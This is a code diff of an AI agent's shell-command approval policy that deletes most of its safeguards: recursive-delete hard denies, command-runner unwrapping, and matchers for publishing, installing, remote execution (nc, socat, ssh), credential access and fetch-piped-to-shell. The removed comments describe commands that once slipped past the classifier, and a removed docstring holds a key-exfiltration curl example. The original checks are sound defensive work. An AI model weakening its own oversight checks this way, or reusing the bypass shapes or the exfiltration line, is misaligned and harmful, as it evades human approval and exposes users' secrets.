@@ -15,7 +15,6 @@ from __future__ import annotations
 import re
 import shlex
 from collections.abc import Callable, Iterator
-from contextvars import ContextVar
 from enum import StrEnum
 from pathlib import PurePath
 
@@ -48,54 +47,8 @@ _WRAPPER_OPTIONS_WITH_VALUE = {
         }
     ),
 }
-# Programs whose own arguments are another command to run. These are not
-# wrappers in the `_unwrap_command_wrappers` sense -- `xargs rm` runs `rm` once
-# per input line rather than becoming it -- but the command they carry has to
-# be classified, or `xargs rm -rf` and `timeout 5 rm -rf` land on the opposite
-# side of the policy from the bare `rm -rf` they are.
-_COMMAND_RUNNERS: dict[str, frozenset[str]] = {
-    "ionice": frozenset({"-c", "--class", "-n", "--classdata", "-p", "--pid"}),
-    "nice": frozenset({"-n", "--adjustment"}),
-    "setsid": frozenset(),
-    "stdbuf": frozenset({"-e", "--error", "-i", "--input", "-o", "--output"}),
-    "time": frozenset({"-f", "--format", "-o", "--output"}),
-    "timeout": frozenset({"-k", "--kill-after", "-s", "--signal"}),
-    "xargs": frozenset(
-        {
-            "-a",
-            "--arg-file",
-            "-d",
-            "--delimiter",
-            "-E",
-            "-I",
-            "-i",
-            "--replace",
-            "-L",
-            "-l",
-            "--max-lines",
-            "-n",
-            "--max-args",
-            "-P",
-            "--max-procs",
-            "-s",
-            "--max-chars",
-        }
-    ),
-}
-# `timeout` alone takes a positional before the command it runs.
-_TIMEOUT_DURATION = re.compile(r"[0-9]+(?:\.[0-9]+)?[smhd]?")
 _ASSIGNMENT = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=.*", re.DOTALL)
-# Whole tokens that are shell operators, and therefore command boundaries.
-# Matched as whole tokens and not character by character: ``shlex`` groups a run
-# of punctuation into one token, and a *quoted* argument made only of those
-# characters arrives here looking identical to an operator. That is how
-# ``aws --query '{}' --cli-binary-format raw s3 cp`` came to be split at its own
-# argument, leaving the next segment to start at an option -- so the executable,
-# which is what every family matcher keys on, was lost and the command was
-# allowed without asking. ``{}`` is on no shell's operator list; ``{`` and ``}``
-# are operators separately, and a bare ``{}`` is an ordinary word (``find -exec
-# rm {} \;`` and ``xargs -I{}`` both rely on that).
-_COMMAND_OPERATORS = frozenset({";", ";;", "&", "&&", "|", "||", "(", ")", "{", "}", "`"})
+_COMMAND_BOUNDARIES = frozenset(";&|\n(){}`")
 _SHELL_COMMAND_WRAPPERS = frozenset({"bash", "dash", "ksh", "sh", "zsh"})
 _SYSTEM_POWER_COMMANDS = frozenset({"halt", "poweroff", "reboot", "shutdown"})
 _POWER_MULTIPLEXERS = frozenset({"busybox", "init", "loginctl", "systemctl", "telinit"})
@@ -111,105 +64,30 @@ class CommandDecision(StrEnum):
     REQUIRE_APPROVAL = "require_approval"
 
 
-# Shell operators, longest first so ``|&`` is not read as ``|`` then ``&``. Split
-# on the RAW command text rather than on tokens: ``shlex`` strips quote
-# provenance, so by the time a token says ``|`` there is no way left to tell the
-# pipeline operator from ``git -C '|' push``, whose repository directory is
-# literally named ``|``. Both used to segment identically, and the second one
-# published without asking.
-_OPERATORS = ("|&", "&&", "||", ";;", ";", "&", "|", "(", ")", "`", "\n")
-# ``{`` and ``}`` are reserved words rather than operators: they separate
-# commands only as whole words (``{ rm x; }``). A brace glued to other characters
-# is an ordinary argument, which is what ``find -exec rm {} \;`` and ``xargs
-# -I{}`` depend on.
-_WORD_OPERATORS = ("{", "}")
-_OPERATOR_ADJACENT = frozenset(" \t\r\n;&|()`")
-
-
-def _operator_at(command: str, index: int) -> str | None:
-    """The operator starting at ``index``, or ``None``.
-
-    Assumes the caller has established that ``index`` is outside quoting.
-    """
-
-    for operator in _OPERATORS:
-        if command.startswith(operator, index):
-            return operator
-    char = command[index]
-    if char in _WORD_OPERATORS:
-        before = command[index - 1] if index else " "
-        after = command[index + 1] if index + 1 < len(command) else " "
-        if before in _OPERATOR_ADJACENT and after in _OPERATOR_ADJACENT:
-            return char
-    return None
-
-
-def _split_on_operators(command: str) -> Iterator[str]:
-    """Yield the command's pieces, split at unquoted operators.
-
-    Quote state is tracked here and nowhere else, because this is the only place
-    that still has it. A single-quoted run is literal; inside double quotes a
-    backslash escapes; outside quotes a backslash escapes the next character. An
-    unterminated quote yields what there is, and the caller's own ``shlex`` pass
-    is what rejects it -- refusing here would make this function decide policy.
-    """
-
-    piece: list[str] = []
-    quote = ""
-    index = 0
-    while index < len(command):
-        char = command[index]
-        if quote:
-            piece.append(char)
-            if char == "\\" and quote == '"' and index + 1 < len(command):
-                piece.append(command[index + 1])
-                index += 2
-                continue
-            if char == quote:
-                quote = ""
-            index += 1
-            continue
-        if char in "'\"":
-            quote = char
-            piece.append(char)
-            index += 1
-            continue
-        if char == "\\" and index + 1 < len(command):
-            piece.append(char)
-            piece.append(command[index + 1])
-            index += 2
-            continue
-        operator = _operator_at(command, index)
-        if operator is not None:
-            text = "".join(piece).strip()
-            if text:
-                yield text
-            piece = []
-            index += len(operator)
-            continue
-        piece.append(char)
-        index += 1
-    text = "".join(piece).strip()
-    if text:
-        yield text
-
-
 def _command_segments(command: str) -> Iterator[list[str]]:
     """Yield compound shell commands as independently classified token lists.
 
-    A conservative lexical split that catches the common sequence, conditional
-    and pipeline forms without pretending to evaluate expansions or reproduce the
-    full shell grammar. The split itself happens on the raw text (see
-    :func:`_split_on_operators`); each piece is then tokenised on its own.
+    This conservative lexical split catches deletion in common sequence,
+    conditional, and pipeline forms without pretending to evaluate expansions
+    or reproduce the full shell grammar.
     """
 
-    for piece in _split_on_operators(command):
-        lexer = shlex.shlex(piece, posix=True)
-        lexer.commenters = ""
-        lexer.whitespace_split = True
-        segment = list(lexer)
-        if segment:
-            yield segment
+    lexer = shlex.shlex(command, posix=True, punctuation_chars=";&|(){}`\n")
+    lexer.commenters = ""
+    # Newlines must remain visible as command boundaries. Quoted newlines are
+    # still returned inside their quoted token and therefore do not split it.
+    lexer.whitespace = " \t\r"
+    lexer.whitespace_split = True
+    segment: list[str] = []
+    for token in lexer:
+        if token and all(char in _COMMAND_BOUNDARIES for char in token):
+            if segment:
+                yield segment
+                segment = []
+            continue
+        segment.append(token)
+    if segment:
+        yield segment
 
 
 def _embedded_shell_command(segment: list[str]) -> str | None:
@@ -228,35 +106,6 @@ def _embedded_shell_command(segment: list[str]) -> str | None:
         if index + 1 < len(segment):
             return segment[index + 1]
     return None
-
-
-def _runner_inner_command(segment: list[str]) -> str | None:
-    """Return the command a recognized command-runner was handed, if any.
-
-    Option values are consumed so the command position is found rather than
-    guessed; an unrecognized option shape ends the scan, which leaves a token
-    that is not an executable in front and matches nothing.
-    """
-
-    if not segment:
-        return None
-    options_with_value = _COMMAND_RUNNERS.get(PurePath(segment[0]).name)
-    if options_with_value is None:
-        return None
-    tokens = segment[1:]
-    while tokens and tokens[0].startswith("-") and tokens[0] != "-":
-        option = tokens.pop(0)
-        if option == "--":
-            break
-        # A value attached to its option (`-n5`, `--max-args=5`) is already
-        # consumed; only a separate one has to be stepped over.
-        if "=" in option or (not option.startswith("--") and len(option) > 2):
-            continue
-        if option in options_with_value and tokens:
-            tokens.pop(0)
-    if PurePath(segment[0]).name == "timeout" and tokens and _TIMEOUT_DURATION.fullmatch(tokens[0]):
-        tokens = tokens[1:]
-    return shlex.join(tokens) if tokens else None
 
 
 def _matches_delete_command(command: str, *, _depth: int = 0) -> bool:
@@ -287,77 +136,13 @@ def _matches_delete_command(command: str, *, _depth: int = 0) -> bool:
                     and _matches_delete_command(embedded_exec, _depth=_depth + 1)
                 ):
                     return True
-        for nested in (_embedded_shell_command(segment), _runner_inner_command(segment)):
-            if (
-                nested is not None
-                and _depth < _MAX_EMBEDDED_SHELL_DEPTH
-                and _matches_delete_command(nested, _depth=_depth + 1)
-            ):
-                return True
-    return False
-
-
-def _is_recursive_delete(argv: list[str]) -> bool:
-    """True when an ``rm`` argv carries a recursive flag.
-
-    ``rm -rf`` walks a tree it was never shown; ``rm -f a.py b.json`` removes
-    exactly the files it names. Only the first is unconditional, which is why
-    the flags are read from tokens rather than matched in the raw string: a
-    regexp anchored right after ``rm`` misses ``rm -f -r`` and a looser one
-    matches the ``-f`` that belongs to a different family entirely.
-    """
-
-    for arg in argv[1:]:
-        if arg == "--":
-            return False
-        if arg in {"--recursive", "--dir", "-d"}:
+        embedded = _embedded_shell_command(segment)
+        if (
+            embedded is not None
+            and _depth < _MAX_EMBEDDED_SHELL_DEPTH
+            and _matches_delete_command(embedded, _depth=_depth + 1)
+        ):
             return True
-        if arg.startswith("--") or not arg.startswith("-"):
-            continue
-        if "r" in arg[1:] or "R" in arg[1:]:
-            return True
-    return False
-
-
-def _matches_recursive_delete(command: str, *, _depth: int = 0) -> bool:
-    """Recognize recursive deletion, the one delete no approval can rescue.
-
-    Reach has to match `_matches_delete_command` exactly. Anything this misses
-    that the other catches is not merely unclassified: it is downgraded from a
-    refusal into a prompt, and the reader is asked to approve the one command
-    the policy exists to refuse.
-    """
-
-    for segment in _command_segments(command):
-        segment = _unwrap_command_wrappers(segment)
-        if not segment:
-            continue
-        executable = PurePath(segment[0]).name
-        if executable == "rm" and _is_recursive_delete(segment):
-            return True
-        if executable == "find":
-            for index, token in enumerate(segment[1:], start=1):
-                if token not in {"-exec", "-execdir"}:
-                    continue
-                executed = _unwrap_command_wrappers(segment[index + 1 :])
-                if not executed:
-                    continue
-                if PurePath(executed[0]).name == "rm" and _is_recursive_delete(executed):
-                    return True
-                embedded_exec = _embedded_shell_command(executed)
-                if (
-                    embedded_exec is not None
-                    and _depth < _MAX_EMBEDDED_SHELL_DEPTH
-                    and _matches_recursive_delete(embedded_exec, _depth=_depth + 1)
-                ):
-                    return True
-        for nested in (_embedded_shell_command(segment), _runner_inner_command(segment)):
-            if (
-                nested is not None
-                and _depth < _MAX_EMBEDDED_SHELL_DEPTH
-                and _matches_recursive_delete(nested, _depth=_depth + 1)
-            ):
-                return True
     return False
 
 
@@ -414,501 +199,30 @@ def _unwrap_command_wrappers(segment: list[str]) -> list[str]:
     return tokens
 
 
-def _iter_argv(command: str, *, _depth: int = 0) -> Iterator[list[str]]:
-    """Yield every argv this command string actually runs, wrappers removed.
-
-    The recursion the family matchers below would each have to repeat: compound
-    segments, ``sudo``/``env``/assignment wrappers, an embedded ``sh -c``, and a
-    command runner's inner command. Written once so a family cannot be
-    accidentally shallower than its neighbours -- the failure that turns
-    ``sh -c "git push"`` into an unclassified command while ``git push`` prompts.
-    """
-
-    for segment in _command_segments(command):
-        segment = _unwrap_command_wrappers(segment)
-        if not segment:
-            continue
-        yield segment
-        if _depth >= _MAX_EMBEDDED_SHELL_DEPTH:
-            continue
-        for nested in (_embedded_shell_command(segment), _runner_inner_command(segment)):
-            if nested is not None:
-                yield from _iter_argv(nested, _depth=_depth + 1)
-
-
-# Global options that take their value as the next word, per executable. This is
-# an accuracy aid, not a safety mechanism: see ``_subcommands``, which cannot
-# under-read whether or not an option appears here. Skipping a known value keeps
-# a path or a profile name from reading as a verb. Listing a boolean flag by
-# mistake would consume the following word, which is why only options certain to
-# take a separate value belong here; options that carry theirs attached
-# (``--git-dir=X``, ``terraform -chdir=DIR``) need no entry.
-_GLOBAL_OPTIONS_WITH_VALUE: dict[str, frozenset[str]] = {
-    "git": frozenset({"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env"}),
-    "gh": frozenset({"-R", "--repo", "--hostname"}),
-    "glab": frozenset({"-R", "--repo", "--host"}),
-    "npm": frozenset({"-C", "--prefix", "-w", "--workspace", "--registry", "--userconfig", "--globalconfig"}),
-    "pnpm": frozenset({"-C", "--dir", "-F", "--filter"}),
-    "yarn": frozenset({"--cwd"}),
-    "bun": frozenset({"--cwd"}),
-    "docker": frozenset({"-H", "--host", "-c", "--context", "--config", "-l", "--log-level"}),
-    "podman": frozenset({"--connection", "--root", "--runtime", "--url"}),
-    "kubectl": frozenset(
-        {
-            "-n",
-            "--namespace",
-            "--context",
-            "--cluster",
-            "--kubeconfig",
-            "--user",
-            "-s",
-            "--server",
-            "--as",
-            "--token",
-            "--request-timeout",
-        }
-    ),
-    "helm": frozenset({"-n", "--namespace", "--kube-context", "--kubeconfig"}),
-    "aws": frozenset(
-        {
-            "--profile",
-            "--region",
-            "--endpoint-url",
-            "--output",
-            "--color",
-            "--ca-bundle",
-            "--cli-read-timeout",
-            "--cli-connect-timeout",
-        }
-    ),
-    "gcloud": frozenset(
-        {
-            "--project",
-            "--account",
-            "--configuration",
-            "--billing-project",
-            "--impersonate-service-account",
-            "--verbosity",
-            "--format",
-        }
-    ),
-    "cargo": frozenset({"-Z", "--manifest-path", "--config", "--color"}),
-    "pip": frozenset(
-        {
-            "-i",
-            "--index-url",
-            "--extra-index-url",
-            "--cache-dir",
-            "--log",
-            "--proxy",
-            "--timeout",
-            "--retries",
-            "--python",
-        }
-    ),
-    "pip3": frozenset(
-        {
-            "-i",
-            "--index-url",
-            "--extra-index-url",
-            "--cache-dir",
-            "--log",
-            "--proxy",
-            "--timeout",
-            "--retries",
-            "--python",
-        }
-    ),
-    "uv": frozenset({"-p", "--python", "--directory", "--project", "--cache-dir", "--config-file", "--color"}),
-    "pipx": frozenset({"--python"}),
-    "poetry": frozenset({"-C", "--directory", "--project"}),
-    "systemctl": frozenset({"-H", "--host", "-M", "--machine", "-t", "--type"}),
-}
-
-
-def _subcommands(argv: list[str]) -> list[str]:
-    """Every non-option word after the executable, in order.
-
-    There is deliberately no limit on how many are returned, and that is the
-    property the callers depend on: **this cannot under-read**. Two earlier
-    versions could. The first skipped options but not their values, so a value
-    was counted as one of the words being looked for. The second consumed the
-    values of a table of known options, which merely moved the failure to the
-    options the table was missing -- ``aws --query '{}' --cli-binary-format raw``
-    exhausted a two-word budget before ``s3``, exactly as
-    ``git --git-dir X --work-tree Y push`` had before ``push``. No table of every
-    option of every tool can be complete, so correctness must not rest on one.
-
-    Returning every word means an unconsumed option value becomes an extra
-    candidate. That can only make a caller match something it need not have,
-    which for a policy means asking about a command it could have allowed -- the
-    direction a safety boundary is allowed to fail in. Under-reading means not
-    asking, which is the direction that let a publish through.
-
-    :data:`_GLOBAL_OPTIONS_WITH_VALUE` is therefore an accuracy aid rather than a
-    safety mechanism: skipping a known option's value keeps ``git -C push
-    status`` (a directory that happens to be named ``push``) from reading as a
-    publish. An option missing from it costs precision, never safety.
-    """
-
-    options_with_value = _GLOBAL_OPTIONS_WITH_VALUE.get(PurePath(argv[0]).name, frozenset())
-    words: list[str] = []
-    rest = list(argv[1:])
-    while rest:
-        word = rest.pop(0)
-        if word == "--":
-            # Everything after it is an argument, so there is no subcommand left
-            # to find. Continuing would collect operands as candidate verbs.
-            break
-        if word.startswith("-"):
-            if "=" not in word and word in options_with_value and rest:
-                rest.pop(0)
-            continue
-        words.append(word)
-    return words
-
-
-_PUBLISH_SUBCOMMANDS: dict[str, frozenset[str]] = {
-    "git": frozenset({"push"}),
-    "gh": frozenset({"pr", "release", "repo", "workflow", "secret"}),
-    "glab": frozenset({"mr", "release", "repo"}),
-    "npm": frozenset({"publish"}),
-    "pnpm": frozenset({"publish"}),
-    "yarn": frozenset({"publish"}),
-    "cargo": frozenset({"publish"}),
-    "docker": frozenset({"push"}),
-    "gcloud": frozenset({"deploy"}),
-    "kubectl": frozenset({"apply", "delete", "create", "patch", "replace"}),
-    "terraform": frozenset({"apply", "destroy"}),
-    "aws": frozenset({"s3", "s3api", "lambda", "cloudformation"}),
-}
-_PUBLISH_EXECUTABLES = frozenset({"twine", "flyctl", "fly", "vercel", "netlify", "heroku"})
-
-_INSTALL_SUBCOMMANDS: dict[str, frozenset[str]] = {
-    "npm": frozenset({"install", "i", "ci", "add", "exec", "create"}),
-    "pnpm": frozenset({"install", "add", "dlx", "create"}),
-    "yarn": frozenset({"install", "add", "dlx", "create"}),
-    "bun": frozenset({"install", "add", "x", "create"}),
-    "pip": frozenset({"install"}),
-    "pip3": frozenset({"install"}),
-    "uv": frozenset({"add", "pip", "tool", "sync"}),
-    "uvx": frozenset(),
-    "pipx": frozenset({"install", "run"}),
-    "poetry": frozenset({"add", "install"}),
-    "gem": frozenset({"install"}),
-    "cargo": frozenset({"install"}),
-    "go": frozenset({"install", "get"}),
-    "brew": frozenset({"install", "reinstall", "upgrade", "tap"}),
-    "apt": frozenset({"install", "upgrade"}),
-    "apt-get": frozenset({"install", "upgrade"}),
-    "dnf": frozenset({"install", "upgrade"}),
-    "yum": frozenset({"install", "upgrade"}),
-    "apk": frozenset({"add"}),
-    "pacman": frozenset({"-S"}),
-    "gh": frozenset({"extension"}),
-    "code": frozenset({"--install-extension"}),
-}
-
-_REMOTE_EXEC_EXECUTABLES = frozenset({"ssh", "scp", "sftp", "rsync", "telnet", "nc", "ncat", "socat"})
-_REMOTE_EXEC_SUBCOMMANDS: dict[str, frozenset[str]] = {
-    "docker": frozenset({"run", "exec", "compose"}),
-    "podman": frozenset({"run", "exec"}),
-    "kubectl": frozenset({"exec", "port-forward", "cp"}),
-}
-
-_CREDENTIAL_EXECUTABLES = frozenset({"security", "keyring", "pass", "op", "vault", "gpg"})
-_CREDENTIAL_SUBCOMMANDS: dict[str, frozenset[str]] = {
-    "gh": frozenset({"auth"}),
-    "glab": frozenset({"auth"}),
-    "aws": frozenset({"configure", "sso"}),
-    "gcloud": frozenset({"auth"}),
-    "az": frozenset({"login"}),
-    "docker": frozenset({"login"}),
-    "npm": frozenset({"login", "adduser", "token"}),
-    "heroku": frozenset({"auth", "login"}),
-    "git": frozenset({"credential"}),
-}
-
-# ``git`` subcommands that discard work the agent cannot get back. Included
-# because a checkpoint is not a backup: the per-turn shadow commit covers the
-# working directory, and these throw away exactly what has not been committed.
-_DESTRUCTIVE_GIT: dict[str, frozenset[str]] = {
-    "reset": frozenset({"--hard"}),
-    "clean": frozenset({"-f", "-fd", "-fdx", "-xdf", "-df", "--force"}),
-    "checkout": frozenset({"--", "-f", "--force"}),
-    "restore": frozenset({"--", "-W", "--worktree", "--staged"}),
-    "branch": frozenset({"-D"}),
-    "push": frozenset({"-f", "--force", "--delete"}),
-    "filter-branch": frozenset(),
-    "stash": frozenset({"drop", "clear"}),
-}
-
-_FETCHERS = frozenset({"curl", "wget", "http", "https", "httpie"})
-# Flags that turn a fetch from "read something" into "write something here" or
-# "send something out". A bare GET to stdout is not in this set on purpose: an
-# editor's agent reads documentation constantly, and prompting for every read
-# trains the reader to approve without looking, which is worse than not asking.
-_FETCH_WRITE_FLAGS = frozenset({"-o", "-O", "--output", "--output-document", "-T", "--upload-file", "--remote-name"})
-_FETCH_SEND_FLAGS = frozenset(
-    {"-d", "--data", "--data-binary", "--data-raw", "--data-urlencode", "-F", "--form", "-X", "--request"}
-)
-
-
-def _matches_publish_command(command: str) -> bool:
-    """A command that pushes work somewhere other people can see it."""
-
-    for argv in _iter_argv(command):
-        executable = PurePath(argv[0]).name
-        if executable in _PUBLISH_EXECUTABLES:
-            return True
-        allowed = _PUBLISH_SUBCOMMANDS.get(executable)
-        if allowed and any(word in allowed for word in _subcommands(argv)):
-            return True
-    return False
-
-
-def _matches_install_command(command: str) -> bool:
-    """A command that installs software.
-
-    Approval-worthy for the reason a lockfile exists: a package manager runs
-    install scripts from the network as the current user, so "install one
-    dependency" and "run arbitrary code" are the same act.
-    """
-
-    for argv in _iter_argv(command):
-        executable = PurePath(argv[0]).name
-        if executable not in _INSTALL_SUBCOMMANDS:
-            continue
-        allowed = _INSTALL_SUBCOMMANDS[executable]
-        if not allowed:
-            return True
-        words = _subcommands(argv)
-        if any(word in allowed for word in words):
-            return True
-        # ``pacman -S`` and ``code --install-extension`` put the verb in an
-        # option rather than a word, so the flags are checked too.
-        if any(token in allowed for token in argv[1:]):
-            return True
-    return False
-
-
-def _matches_remote_exec_command(command: str) -> bool:
-    """A command that runs something, or moves something, on another machine."""
-
-    for argv in _iter_argv(command):
-        executable = PurePath(argv[0]).name
-        if executable in _REMOTE_EXEC_EXECUTABLES:
-            return True
-        allowed = _REMOTE_EXEC_SUBCOMMANDS.get(executable)
-        if allowed and any(word in allowed for word in _subcommands(argv)):
-            return True
-    return False
-
-
-def _matches_credential_command(command: str) -> bool:
-    """A command that reads or writes a credential store."""
-
-    for argv in _iter_argv(command):
-        executable = PurePath(argv[0]).name
-        if executable in _CREDENTIAL_EXECUTABLES:
-            return True
-        allowed = _CREDENTIAL_SUBCOMMANDS.get(executable)
-        if allowed and any(word in allowed for word in _subcommands(argv)):
-            return True
-    return False
-
-
-def _matches_destructive_vcs_command(command: str) -> bool:
-    """A ``git`` command that discards work rather than recording it."""
-
-    for argv in _iter_argv(command):
-        if PurePath(argv[0]).name != "git":
-            continue
-        words = _subcommands(argv)
-        for word in words:
-            flags = _DESTRUCTIVE_GIT.get(word)
-            if flags is None:
-                continue
-            if not flags:
-                return True
-            rest = argv[argv.index(word) + 1 :]
-            if any(token in flags for token in rest):
-                return True
-    return False
-
-
-def _matches_fetch_side_effect(command: str) -> bool:
-    """A download that writes a file, sends data, or is piped into a shell."""
-
-    argv_list = list(_iter_argv(command))
-    for argv in argv_list:
-        executable = PurePath(argv[0]).name
-        if executable not in _FETCHERS:
-            continue
-        for token in argv[1:]:
-            head = token.split("=", 1)[0]
-            if head in _FETCH_WRITE_FLAGS or head in _FETCH_SEND_FLAGS:
-                return True
-    # Fetch piped into an interpreter, which is the shape that makes a download
-    # an execution. Checked across segments rather than inside one, because the
-    # pipe is what splits them.
-    executables = [PurePath(argv[0]).name for argv in argv_list]
-    if any(name in _FETCHERS for name in executables) and any(
-        name in _SHELL_COMMAND_WRAPPERS or name in {"python", "python3", "node", "ruby", "perl", "php"}
-        for name in executables
-    ):
-        return True
-    return False
-
-
-_SURFACE_FAMILIES: ContextVar[tuple[tuple[str, ApprovalMatcher], ...]] = ContextVar(
-    "raven_surface_approval_families", default=()
-)
-
-
-def set_surface_approval_families(families: tuple[tuple[str, ApprovalMatcher], ...]) -> None:
-    """Declare the families every tool on THIS surface must ask about.
-
-    Per surface rather than per tool because a per-tool registration reaches the
-    main loop only: a sub-agent builds its own ``ExecTool`` with its own policy,
-    so a delegated ``git push`` ran unannounced while the identical command asked
-    in the main agent.
-
-    A ContextVar and not a module global, which is the difference between a scope
-    and a leak. A task copies the context it was created in, so every tool built
-    under the connection that declared this -- the main loop's, and each
-    sub-agent's, however deep -- inherits it, while a second connection, or a
-    test, is unaffected by what another one declared.
-
-    Must be set before the tools are built: a policy reads this once at
-    construction, so a tool made earlier keeps the families it was born with.
-    """
-
-    _SURFACE_FAMILIES.set(tuple(families))
-
-
-def surface_approval_families() -> tuple[tuple[str, ApprovalMatcher], ...]:
-    """The families this surface asks about; empty unless one declared them."""
-
-    return _SURFACE_FAMILIES.get()
-
-
-EXTERNAL_EFFECT_MATCHERS: tuple[tuple[str, ApprovalMatcher], ...] = (
-    ("publish_command", _matches_publish_command),
-    ("install_command", _matches_install_command),
-    ("remote_exec_command", _matches_remote_exec_command),
-    ("credential_command", _matches_credential_command),
-    ("destructive_vcs_command", _matches_destructive_vcs_command),
-    ("fetch_side_effect", _matches_fetch_side_effect),
-)
-"""Command families whose effect leaves the working directory, as opt-in matchers.
-
-Not registered by default. The built-in policy asks about exactly one family --
-deletion -- which is right for a terminal the reader is already looking at, and
-wrong for an agent running behind an editor where nothing is on screen. A surface
-that wants to ask registers these; ``raven acp`` does.
-
-The line drawn here is "hard to undo from outside this directory", not "dangerous":
-a build, a test run, a formatter, a file edit and a plain ``curl`` of a
-documentation page all stay unprompted, because a prompt on each of those trains
-the reader to approve without looking -- which costs more than it buys.
-
-**The gap, stated rather than papered over:** any command with network access can
-exfiltrate, and no token-level classifier can see that. ``curl
-https://host/$(cat ~/.ssh/id_rsa)`` is a plain GET. What this catches is the
-careless case and the visible case, not a determined one; containment is the
-sandbox's job, not the classifier's.
-"""
-
-
 class ShellCommandPolicy:
     """Apply hard-deny and approval rules in their required precedence order."""
 
     def __init__(self, *, deny_patterns: list[str]) -> None:
         # Compile once because every direct shell execution crosses this policy.
         self._deny_patterns = tuple(re.compile(pattern, re.IGNORECASE) for pattern in deny_patterns)
-        # Deletion is built in and marked as contained: a sandbox really does hold
-        # it, so a sandboxed turn does not have to ask about it.
-        self._approval_matchers: list[tuple[str, ApprovalMatcher, bool]] = [
-            ("delete_command", _matches_delete_command, False)
-        ]
-        # Whatever this process's surface asks about, picked up at construction so
-        # a tool built later -- a sub-agent's, most of all -- carries the same
-        # families as the one the surface registered on. Without this a delegated
-        # ``git push`` runs unannounced while the main agent's asks.
-        for name, matcher in surface_approval_families():
-            self._approval_matchers.append((name, matcher, True))
+        self._approval_matchers: list[tuple[str, ApprovalMatcher]] = [("delete_command", _matches_delete_command)]
 
-    def register_approval_matcher(self, name: str, matcher: ApprovalMatcher, *, escapes_sandbox: bool = True) -> None:
-        """Extend approval classification with a named command-family matcher.
+    def register_approval_matcher(self, name: str, matcher: ApprovalMatcher) -> None:
+        """Extend approval classification with a named command-family matcher."""
 
-        ``escapes_sandbox`` says whether a sandbox contains this family's effect.
-        It is True by default because the families a surface registers are the
-        ones whose effects leave the workspace -- pushing, installing, reaching
-        another machine -- and a microVM does not contain a network call. A
-        family a sandbox really does hold (deletion) sets it False, which is what
-        lets a sandboxed turn skip the prompt it does not need.
-        """
+        self._approval_matchers.append((name, matcher))
 
-        self._approval_matchers.append((name, matcher, escapes_sandbox))
-
-    def approval_reason(self, command: str, *, sandboxed: bool = False) -> str | None:
-        """The name of the family that makes this command need approval.
-
-        Separate from :meth:`evaluate` because the caller needs both answers and
-        they are not the same question: ``evaluate`` decides, this explains. A
-        prompt that says only "this command needs approval" gives the reader
-        nothing to decide with, and the description ``ExecTool`` used before this
-        existed was a constant -- it read "Delete files using a shell command"
-        for every family, because deletion was the only one registered.
-
-        Returns ``None`` when nothing requires approval, including for a
-        hard-denied command: there is no prompt to explain.
-        """
-
-        if not sandboxed and any(pattern.search(command) for pattern in self._deny_patterns):
-            return None
-        try:
-            if not sandboxed and (_matches_recursive_delete(command) or _matches_system_power_command(command)):
-                return None
-            for name, matcher, escapes in self._approval_matchers:
-                if sandboxed and not escapes:
-                    continue
-                if matcher(command):
-                    return name
-        except Exception:
-            # Mirrors ``evaluate``'s fail-closed branch, which turns a faulty
-            # matcher into a hard deny -- and a hard deny has no reason to give.
-            return None
-        return None
-
-    def evaluate(self, command: str, *, sandboxed: bool = False) -> CommandDecision:
-        """Classify a command, reducing authority when a matcher cannot decide.
-
-        ``sandboxed`` drops the checks a sandbox makes unnecessary and keeps the
-        ones it does not. A microVM contains what a command does to the
-        filesystem, so the deny list and the contained families are skipped; it
-        does not contain a push, an install or a connection to another machine,
-        so those families still ask. Skipping them all -- which is what a plain
-        short-circuit on the sandbox flag does -- makes the safer configuration
-        prompt LESS than the unsandboxed one, for exactly the operations the
-        sandbox has no say over.
-        """
+    def evaluate(self, command: str) -> CommandDecision:
+        """Classify a command, reducing authority when a matcher cannot decide."""
 
         # Hard deny runs first so an approval matcher can never convert an
         # unconditionally forbidden command into an approvable operation.
-        #
-        # Every refusal below is about damage a sandbox holds: a deny pattern, a
-        # tree walked away, the machine powered off. Inside a microVM the machine
-        # in question IS the sandbox, which is what the sandboxed path is allowed
-        # to skip -- and skipping it is the point of running one.
-        if not sandboxed:
-            if any(pattern.search(command) for pattern in self._deny_patterns):
-                return CommandDecision.HARD_DENY
+        if any(pattern.search(command) for pattern in self._deny_patterns):
+            return CommandDecision.HARD_DENY
         try:
-            if not sandboxed and (_matches_recursive_delete(command) or _matches_system_power_command(command)):
+            if _matches_system_power_command(command):
                 return CommandDecision.HARD_DENY
-            if any(matcher(command) for _name, matcher, escapes in self._approval_matchers if escapes or not sandboxed):
+            if any(matcher(command) for _, matcher in self._approval_matchers):
                 return CommandDecision.REQUIRE_APPROVAL
         except Exception:
             # Matchers inspect untrusted command text and may be extended later.
@@ -917,11 +231,4 @@ class ShellCommandPolicy:
         return CommandDecision.ALLOW
 
 
-__all__ = [
-    "EXTERNAL_EFFECT_MATCHERS",
-    "ApprovalMatcher",
-    "CommandDecision",
-    "ShellCommandPolicy",
-    "set_surface_approval_families",
-    "surface_approval_families",
-]
+__all__ = ["ApprovalMatcher", "CommandDecision", "ShellCommandPolicy"]
